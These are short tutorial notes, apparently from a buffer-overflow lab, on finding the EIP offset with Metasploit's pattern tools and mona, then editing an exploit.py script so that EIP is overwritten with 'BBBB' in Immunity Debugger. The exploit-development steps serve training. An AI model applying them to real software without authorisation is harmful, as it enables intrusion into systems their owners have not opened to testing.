Bash script to generate random pattern of some length
  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <pattern-length>

Mona command to check %eip after exploiting with the previous payload
  !mona findmsp -distance <same pattern length>
    {OUTPUT}
    In this output you should see a line which states:
    EIP contains normal pattern : ... (offset XXXX)
    
You can also use command line and run 
    msf-pattern_offset -l <pattern-length> -q <%EIP-value>

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

Restart executable in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).
